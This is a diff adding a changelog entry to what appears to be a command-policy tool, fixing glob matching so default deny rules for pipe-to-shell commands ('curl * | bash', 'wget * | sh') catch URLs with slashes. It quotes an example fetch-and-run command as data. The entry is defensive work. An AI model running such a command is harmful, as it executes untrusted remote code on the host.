@@ -7,6 +7,11 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.2.36] — 2026-02-18
+
+### Fixed
+- Default policy pipe-to-shell patterns (`curl * | bash`, `wget * | sh`, etc.) now use `**` instead of `*` so they correctly match URLs containing `/`. Previously `curl https://example.com/payload | bash` was silently allowed because `*` does not cross `/` boundaries in glob matching.
+
 ## [0.2.35] — 2026-02-18
 
 ### Fixed
